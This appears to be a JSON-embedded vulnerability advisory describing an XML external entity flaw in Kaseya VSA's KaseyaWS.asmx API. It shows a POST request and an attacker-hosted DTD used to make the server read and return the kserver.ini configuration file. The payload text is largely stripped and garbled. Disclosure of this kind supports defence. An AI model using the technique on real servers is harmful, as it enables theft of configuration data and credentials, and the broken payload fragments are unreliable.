    "description": "The API /vsaWS/KaseyaWS.asmx can be used to submit XML to the system. When this XML is processed (external) entities are insecurely processed and fetched by the system and returned to the attacker. Detailed description Given the following request ``` POST /vsaWS/KaseyaWS.asmx HTTP/1.1 Content-Type text/xmlcharset=UTF-8 Host 192.168.1.19418081 Content-Length 406 &send]]> ``` And the following XML file hosted at http//192.168.1.170/oob.dtd ``` > %eval %error ``` The server will fetch this XML file and process it, it will read the file c\\\\kaseya\\\\kserver\\\\kserver.ini and returns the content in the server response like below.
